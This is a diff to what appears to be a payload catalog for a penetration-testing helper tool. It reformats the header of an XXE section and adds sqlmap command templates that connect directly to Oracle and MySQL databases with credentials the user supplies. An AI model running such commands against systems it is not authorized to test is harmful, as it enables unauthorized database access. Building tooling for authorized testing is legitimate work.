@@ -48,7 +48,7 @@ Optional: callback (used for prompt variable)
 */
 
 
-// ########## XXE Attacks
+// ########## XXE Attacks ####################
 
 Load({
 	title: "Remote DTD File Parsing",
@@ -96,6 +96,31 @@ Load({
 	},
 	category: "XML"
 })
+
+
+// ####### sqlmap #########
+
+Load({
+	title: "Use sqlmap to directly connect to an Oracle db (requires Oracle instant client)",
+	payload: "sqlmap -d 'oracle://<PROMPT (username:password)>@<RHOST>:<RPORT>/<PATH (SID)>'",
+	category: "SQLi",
+	callback: function(bro){
+		question("What DB credentials would you like to use? (Enter as username:password)");
+		ask.some(questions, bro);
+	}
+})
+
+Load({
+	title: "Use sqlmap to directly connect to a MySQL db",
+	payload: "sqlmap -d 'mysql://<PROMPT (username:password)>@<RHOST>:<RPORT>/<PATH (dbname)>'",
+	category: "SQLi",
+	callback: function(bro){
+		question("What DB credentials would you like to use? (Enter as username:password)");
+		ask.some(questions, bro);
+	}
+})
+
+// sqlmap -d "mysql://<user>:<password>@<host>:<port>/<dbname>"
 
 /*
 ######################################################
